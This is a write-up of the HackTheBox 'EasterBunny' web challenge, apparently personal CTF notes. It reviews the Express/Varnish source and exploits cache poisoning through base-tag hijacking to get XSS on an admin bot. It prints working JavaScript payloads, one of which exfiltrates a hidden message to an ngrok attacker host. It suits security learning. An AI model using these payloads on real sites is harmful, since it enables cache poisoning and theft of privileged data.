---
Category:
  - Web
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags:
  - OAST
  - base_tag-hijacking
  - cache-poisoning
  - XSS
---
>[!quote]
> *It's that time of the year again! Write a letter to the Easter bunny and make your wish come true! But be careful what you wish for because the Easter bunny's helpers are watching!*


# Set up

- build-docker.sh
    
    ```bash
    #!/bin/bash
    docker rm -f web_easterbunny
    docker build --tag=web_easterbunny .
    docker run -p 1337:80 -it --name=web_easterbunny web_easterbunny
    ```
    
- Dockerfile
    
    ```bash
    FROM node:current-buster-slim
    
    # Install Chrome
    RUN apt update \
        && apt install -y wget gnupg \
        && wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add - \
        && sh -c 'echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google.list' \
        && apt update \
        && apt install -y google-chrome-stable fonts-ipafont-gothic fonts-wqy-zenhei fonts-thai-tlwg fonts-kacst fonts-freefont-ttf libxss1 libxshmfence-dev \
        --no-install-recommends \
        && rm -rf /var/lib/apt/lists/*
    
    # Install varnish & supervisord
    RUN apt update \
        && wget -q -O - https://packagecloud.io/varnishcache/varnish60lts/gpgkey | apt-key add - \
        && sh -c 'echo "deb https://packagecloud.io/varnishcache/varnish60lts/debian/ buster main" >> /etc/apt/sources.list.d/varnishcache_varnish60lts.list' \
        && apt update \
        && apt install -y varnish apt-transport-https supervisor \
        && rm -rf /var/lib/apt/lists/*
    
    RUN dd if=/dev/urandom of=/etc/varnish/secret count=1
    
    # Setup varnish and supervisord
    COPY ./config/cache.vcl /etc/varnish/default.vcl
    COPY ./config/supervisord.conf /etc/supervisor/supervisord.conf
    
    # Setup app
    RUN mkdir -p /app
    
    # Add application
    WORKDIR /app
    COPY --chown=www-data:www-data challenge .
    
    # Install dependencies
    RUN yarn
    
    # Expose the port application is reachable on
    EXPOSE 80
    
    # Start supervisord
    CMD ["/usr/bin/supervisord", "-c", "/etc/supervisor/supervisord.conf"]
    ```
    

# Information Gathering

## The application at-a-glance 🔍

Homepage allows to write a letter, view other letters and apply a stamp:

![Untitled](../../zzz_res/attachments/EasterBunny%20e580b8ca86214deb837383b8e4c495a4.png)

![Untitled](../../zzz_res/attachments/EasterBunny%20e580b8ca86214deb837383b8e4c495a4%201.png)

Apply stamp:

```
POST /submit HTTP/1.1
Host: 104.248.173.13:32511
Content-Length: 28
User-Agent: USR_ozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://104.248.173.13:32511
Referer: http://104.248.173.13:32511/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"message":"Test test test"}

HTTP/1.1 201 Created
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 13
ETag: W/"d-83MehtQtk8Du/zgLRvcbNL9jo3I"
Date: Tue, 19 Jul 2022 09:58:14 GMT
X-Varnish: 98327
Age: 0
Via: 1.1 varnish (Varnish/6.1)
X-Cache: MISS
X-Cache-Hits: 0
Connection: close

{"message":7}
```

View letters:

```
GET /letters?id=7 HTTP/1.1
Host: 104.248.173.13:32511
Upgrade-Insecure-Requests: 1
User-Agent: USR_ozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://104.248.173.13:32511/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

GET /message/7 HTTP/1.1
Host: 104.248.173.13:32511
User-Agent: USR_ozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: */*
Referer: http://104.248.173.13:32511/letters?id=7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 38
ETag: W/"26-lEIMyUkSOb5IlyAn1padBFq7W+c"
Date: Tue, 19 Jul 2022 09:58:18 GMT
X-Varnish: 98337
Age: 0
Via: 1.1 varnish (Varnish/6.1)
X-Cache: MISS
X-Cache-Hits: 0
Accept-Ranges: bytes
Connection: close

{"message":"Test test test","count":7}
```

## Source code review

- package.json
    
    ```json
    {
      "name": "web_easterbunny",
      "version": "1.0.0",
      "description": "",
      "main": "index.js",
      "scripts": {
        "start": "node index.js",
        "test": "echo \"Error: no test specified\" && exit 1"
      },
      "keywords": [],
      "author": "JoshSH",
      "license": "ISC",
      "dependencies": {
        "cookie-parser": "^1.4.6",
        "express": "^4.17.2",
        "nunjucks": "^3.2.3",
        "puppeteer": "^13.3.2",
        "sqlite-async": "^1.1.2"
      }
    }
    ```
    
- index.js
    
    ```jsx
    const express      = require('express');
    const app          = express();
    const nunjucks     = require('nunjucks');
    const cookieParser = require('cookie-parser');
    const routes       = require('./routes/routes');
    const Database     = require('./utils/database');
    
    const db = new Database('./database.db');
    
    app.use(cookieParser());
    app.use(express.json());
    app.set('trust proxy', process.env.PROXY !== 'false');
    app.use('/static', express.static('static'));
    
    nunjucks.configure("views", {
        autoescape: true,
        express: app,
        views: "templates",
    });
    
    app.use(routes(db));
    
    app.all('*', (req, res) => {
        return res.status(404).send({
            message: '404 page not found'
        });
    });
    
    app.use(function (err, req, res, next) {
        res.status(500).json({
            message: 'Something went wrong!'
        });
    });
    
    (async() => {
        await db.connect();
        await db.migrate();
        app.listen(1337, '0.0.0.0', () => console.log('Listening on port 1337'));
    })();
    ```
    
- routes/routes.js
    
    ```jsx
    const { isAdmin, authSecret } = require("../utils/authorisation");
    const express                 = require("express");
    const router                  = express.Router({caseSensitive: true});
    const visit                   = require("../utils/bot.js");
    
    let db;
    let botVisiting = false;
    
    const response = data => ({ message: data });
    
    router.get("/", (req, res) => {
        return res.render("index.html", {
            cdn: `${req.protocol}://${req.hostname}:${req.headers["x-forwarded-port"] ?? 80}/static/`,
        });
    });
    
    router.get("/letters", (req, res) => {
        return res.render("viewletters.html", {
            cdn: `${req.protocol}://${req.hostname}:${req.headers["x-forwarded-port"] ?? 80}/static/`,
        });
    });
    
    router.post("/submit", async (req, res) => {
        const { message } = req.body;
    
        if (message) {
            return db.insertMessage(message)
                .then(async inserted => {
                    try {
                        botVisiting = true;
                        await visit(`http://127.0.0.1/letters?id=${inserted.lastID}`, authSecret);
                        botVisiting = false;
                    }
                    catch (e) {
                        console.log(e);
                        botVisiting = false;
                    }
                    res.status(201).send(response(inserted.lastID));
                })
                .catch(() => {
                    res.status(500).send(response('Something went wrong!'));
                });
        }
        return res.status(401).send(response('Missing required parameters!'));
    });
    
    router.get("/message/:id", async (req, res) => {
        try {
            const { id } = req.params;
            const { count } = await db.getMessageCount();
            const message = await db.getMessage(id);
    
            if (!message) return res.status(404).send({
                error: "Can't find this note!",
                count: count
            });
    
            if (message.hidden && !isAdmin(req))
                return res.status(401).send({
                    error: "Sorry, this letter has been hidden by the easter bunny's helpers!",
                    count: count
                });
    
            if (message.hidden) res.set("Cache-Control", "private, max-age=0, s-maxage=0 ,no-cache, no-store");
    
            return res.status(200).send({
                message: message.message,
                count: count,
            });
        } catch (error) {
            console.error(error);
            res.status(500).send({
                error: "Something went wrong!",
            });
        }
    });
    
    module.exports = (database) => {
        db = database;
        return router;
    };
    ```
    
- utils/authorisation.js
    
    ```jsx
    const authSecret = require('crypto').randomBytes(69).toString('hex');
    
    const isAdmin = (req, res) => {
      return req.ip === '127.0.0.1' && req.cookies['auth'] === authSecret;
    };
    
    module.exports = {
      authSecret,
      isAdmin,
    };
    ```
    
- utils/bot.js
    
    ```jsx
    const puppeteer = require('puppeteer');
    
    const browser_options = {
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-background-networking',
            '--disable-default-apps',
            '--disable-extensions',
            '--disable-gpu',
            '--disable-sync',
            '--disable-translate',
            '--hide-scrollbars',
            '--metrics-recording-only',
            '--mute-audio',
            '--no-first-run',
            '--safebrowsing-disable-auto-update',
            '--js-flags=--noexpose_wasm,--jitless'
        ],
    };
    
    const visit = async(url, authSecret) => {
        try {
            const browser = await puppeteer.launch(browser_options);
            let context = await browser.createIncognitoBrowserContext();
            let page = await context.newPage();
    
            await page.setCookie({
                name: 'auth',
                value: authSecret,
                domain: '127.0.0.1',
            });
    
            await page.goto(url, {
                waitUntil: 'networkidle2',
                timeout: 5000,
            });
            await page.waitForTimeout(3000);
            await browser.close();
        } catch (e) {
            console.log(e);
        }
    };
    
    module.exports = visit;
    ```
    
- utils/database.js
    
    ```jsx
    const sqlite = require("sqlite-async");
    
    class Database {
        constructor(db_file) {
            this.db_file = db_file;
            this.db = undefined;
        }
    
        async connect() {
            this.db = await sqlite.open(this.db_file);
        }
    
        async migrate() {
            return this.db.exec(`
                DROP TABLE IF EXISTS messages;
    
                CREATE TABLE IF NOT EXISTS messages (
                    id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
                    message   VARCHAR(300) NOT NULL,
                    hidden    INTEGER NOT NULL
                );
    
                INSERT INTO messages (id, message, hidden) VALUES
                  (1, "Dear Easter Bunny,\nPlease could I have the biggest easter egg you have?\n\nThank you\nGeorge", 0),
                  (2, "Dear Easter Bunny,\nCould I have 3 chocolate bars and 2 easter eggs please!\nYours sincerly, Katie", 0),
                  (3, "Dear Easter Bunny, Santa's better than you! HTB{f4k3_fl4g_f0r_t3st1ng}", 1),
                  (4, "Hello Easter Bunny,\n\nCan I have a PlayStation 5 and a chocolate chick??", 0),
                  (5, "Dear Ester Bunny,\nOne chocolate and marshmallow bunny please\n\nLove from Milly", 0),
                  (6, "Dear Easter Bunny,\n\nHow are you? Im fine please may I have 31 chocolate bunnies\n\nThank you\nBeth", 0);
                `);
        }
    
        async getMessage(id) {
            return new Promise(async(resolve, reject) => {
                try {
                    let stmt = await this.db.prepare("SELECT * FROM messages WHERE id = ?");
                    resolve(await stmt.get(id));
                } catch (e) {
                    reject(e);
                }
            });
        }
    
        async getMessageCount() {
            return new Promise(async(resolve, reject) => {
                try {
                    let stmt = await this.db.prepare("SELECT COUNT(*) as count FROM messages");
                    resolve(await stmt.get());
                } catch (e) {
                    reject(e);
                }
            });
        }
    
        async insertMessage(message) {
            return new Promise(async(resolve, reject) => {
                try {
                    let stmt = await this.db.prepare("INSERT INTO messages (message, hidden) VALUES (?, ?)");
                    resolve(await stmt.run(message, false));
                } catch (e) {
                    reject(e);
                }
            });
        }
    }
    
    module.exports = Database;
    ```
    

# The Bug

[Web Cache Poisoning](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Web%20Cache%20Poisoning.md)

Base-tag hijacking the cache:

![Untitled](../../zzz_res/attachments/EasterBunny%20e580b8ca86214deb837383b8e4c495a4%202.png)

![Untitled](../../zzz_res/attachments/EasterBunny%20e580b8ca86214deb837383b8e4c495a4%203.png)

Cached page is served to the bot and page scripts are retrieved from attacker’s injected host:

![Untitled](../../zzz_res/attachments/EasterBunny%20e580b8ca86214deb837383b8e4c495a4%204.png)

# Exploitation

## Exploitation #1 - Force write

Created an suitable directory structure and XSS payload: 

```bash
$ mkdir :80/
$ mkdir :80/static/
$ nano viewletter.js
fetch("http://127.0.0.1:80/message/3").then((r) => {
    return r.text();
}).then((x) => {
    fetch("http://127.0.0.1/submit", {
        "headers": {
            "content-type": "application/json"
        },
        "body": x,
        "method": "POST",
        "mode": "cors",
        "credentials": "omit"
    });
});

```

Poisoned the cache for the next letter:

```
GET /letters?id=16 HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: USR_ozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://159.65.59.5:31184/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
X-Forwarded-Host: ed97-2-42-243-225.ngrok.io/

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 2135
ETag: W/"857-UZNX9ULB7Ou8CQnYWfnNTpY8xwI"
Date: Tue, 19 Jul 2022 14:36:32 GMT
X-Varnish: 294962 196897
Age: 1
Via: 1.1 varnish (Varnish/6.1)
X-Cache: HIT
X-Cache-Hits: 5
Accept-Ranges: bytes
Connection: close
...
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<base href="http://ed97-2-42-243-225.ngrok.io/:80/static/" />
<link rel="preconnect" href="https://fonts.googleapis.com" />
...
```

Submitted a letter and triggered the bot:

![Untitled](../../zzz_res/attachments/EasterBunny%20e580b8ca86214deb837383b8e4c495a4%205.png)

![Untitled](../../zzz_res/attachments/EasterBunny%20e580b8ca86214deb837383b8e4c495a4%206.png)

Poisoned cached page served to the bot and exploited the XSS to force it to write another letter containing the flag:

![Untitled](../../zzz_res/attachments/EasterBunny%20e580b8ca86214deb837383b8e4c495a4%207.png)

## Exploitation #2 - OAST

Poisoned the web cache for Host 127.0.0.1 (the same used by the bot) in order to include an arbitrary JavaScript:

![Untitled](../../zzz_res/attachments/EasterBunny%20e580b8ca86214deb837383b8e4c495a4%208.png)

Payload injected:

```jsx
var url = "http://127.0.0.1/message/3";
var attacker = "http://5a78-2-42-243-225.ngrok.io/exfil";
var xhr  = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', url, true);
xhr.send(null);
```

Triggered the bot and exfiltrated the flag:

![Untitled](../../zzz_res/attachments/EasterBunny%20e580b8ca86214deb837383b8e4c495a4%209.png)

![Untitled](../../zzz_res/attachments/EasterBunny%20e580b8ca86214deb837383b8e4c495a4%2010.png)

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB/web_easterbunny/exploit]
└─$ echo -n 'eyJtZXNzYWdlIjoiRGVhciBFYXN0ZXIgQnVubnksIFNhbnRhJ3MgYmV0dGVyIHRoYW4geW91ISBIVEJ7N2gzXzNhczdlcl9idW5ueV9oNDVfYjMzbl9wMDE1MG4zZCF9IiwiY291bnQiOjEyfQ==' | base64 -d                                      
{"message":"Dear Easter Bunny, Santa's better than you! HTB{7h3_3as7er_bunny_h45_b33n_p0150n3d!}","count":12}
```

# Flag

>[!success]
>`HTB{7h3_3as7er_bunny_h45_b33n_p0150n3d!}`

